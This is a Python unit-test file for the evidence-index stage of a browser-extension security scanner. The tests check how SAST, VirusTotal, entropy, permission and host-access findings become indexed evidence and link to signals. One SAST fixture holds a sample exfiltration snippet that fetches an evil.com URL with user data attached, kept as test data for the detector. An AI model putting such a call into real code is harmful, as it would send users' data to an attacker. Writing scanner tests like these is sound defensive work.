"""
Unit tests for Evidence Index Builder (Stage 3)
"""

import pytest
from datetime import datetime

from extension_shield.governance.schemas import (
    Facts,
    ManifestFacts,
    SecurityFindings,
    SastFinding,
    VirusTotalFileFinding,
    EntropyFileFinding,
    PermissionAnalysisFinding,
    FileInventoryItem,
)
from extension_shield.governance.evidence_index_builder import (
    EvidenceIndexBuilder,
    EvidenceSource,
    link_evidence_to_signals,
)


@pytest.fixture
def base_manifest():
    """Create a base manifest for testing."""
    return ManifestFacts(
        name="Test Extension",
        version="1.0.0",
        manifest_version=3,
        permissions=[],
        host_permissions=[],
    )


@pytest.fixture
def base_facts(base_manifest):
    """Create base facts for testing."""
    return Facts(
        scan_id="test_scan_001",
        extension_id="test_ext_001",
        manifest=base_manifest,
        host_access_patterns=[],
        security_findings=SecurityFindings(),
        file_inventory=[
            FileInventoryItem(
                path="manifest.json",
                file_type="json",
                sha256="abc123def456",
            ),
            FileInventoryItem(
                path="src/background.js",
                file_type="js",
                sha256="789xyz",
            ),
        ],
    )


class TestEvidenceIndexBuilderSast:
    """Tests for SAST evidence extraction."""
    
    def test_extracts_sast_evidence(self, base_facts):
        """Should extract evidence from SAST findings."""
        base_facts.security_findings.sast_findings = [
            SastFinding(
                file_path="src/background.js",
                finding_type="data-exfil",
                severity="high",
                description="Data exfiltration detected",
                line_number=42,
                code_snippet="fetch('https://evil.com/steal?data=' + userData)",
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        assert len(evidence_index.evidence) >= 1
        
        # Find the SAST evidence
        sast_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.SAST)
        ]
        assert len(sast_evidence) == 1
        
        ev = sast_evidence[0]
        assert ev.file_path == "src/background.js"
        assert ev.line_start == 42
        assert "fetch" in ev.snippet
        assert "data-exfil" in ev.provenance
        assert "[HIGH]" in ev.provenance
    
    def test_multiple_sast_findings(self, base_facts):
        """Should extract multiple SAST evidence items."""
        base_facts.security_findings.sast_findings = [
            SastFinding(
                file_path="src/a.js",
                finding_type="xss",
                severity="medium",
                description="XSS vulnerability",
                line_number=10,
            ),
            SastFinding(
                file_path="src/b.js",
                finding_type="eval-usage",
                severity="high",
                description="Eval usage detected",
                line_number=20,
            ),
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        sast_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.SAST)
        ]
        assert len(sast_evidence) == 2


class TestEvidenceIndexBuilderVirusTotal:
    """Tests for VirusTotal evidence extraction."""
    
    def test_extracts_malicious_vt_evidence(self, base_facts):
        """Should extract evidence from malicious VirusTotal findings."""
        base_facts.security_findings.virustotal_findings = [
            VirusTotalFileFinding(
                file_name="malware.js",
                file_path="src/malware.js",
                sha256="deadbeef123",
                detection_stats={"malicious": 5, "suspicious": 2, "total": 70},
                threat_level="malicious",
                malware_families=["Trojan.Generic", "Adware.X"],
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        vt_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.VIRUSTOTAL)
        ]
        assert len(vt_evidence) == 1
        
        ev = vt_evidence[0]
        assert ev.file_path == "src/malware.js"
        assert "sha256:deadbeef123" in ev.file_hash
        assert "5/70 malicious" in ev.provenance
        assert "Trojan.Generic" in ev.provenance
    
    def test_ignores_clean_vt_findings(self, base_facts):
        """Should not extract evidence from clean VirusTotal findings."""
        base_facts.security_findings.virustotal_findings = [
            VirusTotalFileFinding(
                file_name="clean.js",
                file_path="src/clean.js",
                sha256="cleanfile",
                threat_level="clean",
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        vt_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.VIRUSTOTAL)
        ]
        assert len(vt_evidence) == 0


class TestEvidenceIndexBuilderEntropy:
    """Tests for entropy evidence extraction."""
    
    def test_extracts_obfuscated_evidence(self, base_facts):
        """Should extract evidence from obfuscated files."""
        base_facts.security_findings.entropy_findings = [
            EntropyFileFinding(
                file_name="packed.js",
                file_path="src/packed.js",
                byte_entropy=7.8,
                char_entropy=7.5,
                risk_level="high",
                is_likely_obfuscated=True,
                obfuscation_patterns=["base64_blocks", "hex_encoding"],
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        entropy_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.ENTROPY)
        ]
        assert len(entropy_evidence) == 1
        
        ev = entropy_evidence[0]
        assert ev.file_path == "src/packed.js"
        assert "byte_entropy=7.80" in ev.provenance
        assert "base64_blocks" in ev.provenance
    
    def test_ignores_normal_entropy(self, base_facts):
        """Should not extract evidence from normal entropy files."""
        base_facts.security_findings.entropy_findings = [
            EntropyFileFinding(
                file_name="normal.js",
                file_path="src/normal.js",
                byte_entropy=4.5,
                char_entropy=4.2,
                risk_level="normal",
                is_likely_obfuscated=False,
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        entropy_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.ENTROPY)
        ]
        assert len(entropy_evidence) == 0


class TestEvidenceIndexBuilderPermissions:
    """Tests for permission evidence extraction."""
    
    def test_extracts_dangerous_permission_evidence(self, base_facts):
        """Should extract evidence from unreasonable permissions."""
        base_facts.security_findings.permission_findings = [
            PermissionAnalysisFinding(
                permission_name="webRequest",
                is_reasonable=False,
                justification_reasoning="No clear business need for network interception",
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        perm_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.PERMISSION)
        ]
        assert len(perm_evidence) == 1
        
        ev = perm_evidence[0]
        assert ev.file_path == "manifest.json"
        assert "webRequest" in ev.provenance
        assert "webRequest" in ev.snippet
    
    def test_ignores_reasonable_permissions(self, base_facts):
        """Should not extract evidence from reasonable permissions."""
        base_facts.security_findings.permission_findings = [
            PermissionAnalysisFinding(
                permission_name="storage",
                is_reasonable=True,
                justification_reasoning="Storage is commonly needed",
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        perm_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.PERMISSION)
        ]
        assert len(perm_evidence) == 0


class TestEvidenceIndexBuilderManifest:
    """Tests for manifest evidence extraction."""
    
    def test_extracts_broad_host_pattern_evidence(self, base_facts):
        """Should extract evidence for broad host patterns."""
        base_facts.host_access_patterns = ["<all_urls>", "https://example.com/*"]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        manifest_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.MANIFEST)
        ]
        assert len(manifest_evidence) == 1
        
        ev = manifest_evidence[0]
        assert ev.file_path == "manifest.json"
        assert "<all_urls>" in ev.snippet
    
    def test_no_evidence_for_specific_patterns(self, base_facts):
        """Should not extract evidence for specific domain patterns."""
        base_facts.host_access_patterns = ["https://example.com/*"]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        manifest_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.MANIFEST)
        ]
        assert len(manifest_evidence) == 0


class TestEvidenceIndexBuilderIntegration:
    """Integration tests for Evidence Index Builder."""
    
    def test_unique_evidence_ids(self, base_facts):
        """Should generate unique evidence IDs."""
        base_facts.host_access_patterns = ["<all_urls>"]
        base_facts.security_findings.sast_findings = [
            SastFinding(
                file_path="src/a.js",
                finding_type="xss",
                severity="high",
                description="XSS",
                line_number=1,
            ),
            SastFinding(
                file_path="src/b.js",
                finding_type="sqli",
                severity="high",
                description="SQL injection",
                line_number=2,
            ),
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        evidence_ids = list(evidence_index.evidence.keys())
        assert len(evidence_ids) == len(set(evidence_ids))  # All unique
    
    def test_scan_id_preserved(self, base_facts):
        """Should preserve scan_id in output."""
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        assert evidence_index.scan_id == "test_scan_001"
    
    def test_file_hash_from_inventory(self, base_facts):
        """Should use file hash from inventory when available."""
        base_facts.security_findings.sast_findings = [
            SastFinding(
                file_path="src/background.js",
                finding_type="test",
                severity="low",
                description="Test finding",
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        sast_evidence = [
            ev for ev in evidence_index.evidence.values()
            if ev.provenance.startswith(EvidenceSource.SAST)
        ]
        assert len(sast_evidence) == 1
        assert "sha256:789xyz" in sast_evidence[0].file_hash


class TestLinkEvidenceToSignals:
    """Tests for evidence-to-signal linking."""
    
    def test_links_manifest_evidence_to_host_perms(self, base_facts):
        """Should link manifest evidence to HOST_PERMS_BROAD signals."""
        base_facts.host_access_patterns = ["<all_urls>"]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        signals_dict = {
            "scan_id": "test_scan_001",
            "signals": [
                {"signal_id": "sig_001", "type": "HOST_PERMS_BROAD", "evidence_refs": []},
            ]
        }
        
        updated = link_evidence_to_signals(evidence_index, signals_dict, base_facts)
        
        assert len(updated["signals"][0]["evidence_refs"]) > 0
    
    def test_links_sast_evidence_to_endpoint(self, base_facts):
        """Should link SAST evidence to ENDPOINT_FOUND signals."""
        base_facts.security_findings.sast_findings = [
            SastFinding(
                file_path="src/api.js",
                finding_type="fetch",
                severity="medium",
                description="External fetch",
            )
        ]
        
        builder = EvidenceIndexBuilder()
        evidence_index = builder.build(base_facts)
        
        signals_dict = {
            "scan_id": "test_scan_001",
            "signals": [
                {"signal_id": "sig_001", "type": "ENDPOINT_FOUND", "evidence_refs": []},
            ]
        }
        
        updated = link_evidence_to_signals(evidence_index, signals_dict, base_facts)
        
        assert len(updated["signals"][0]["evidence_refs"]) > 0

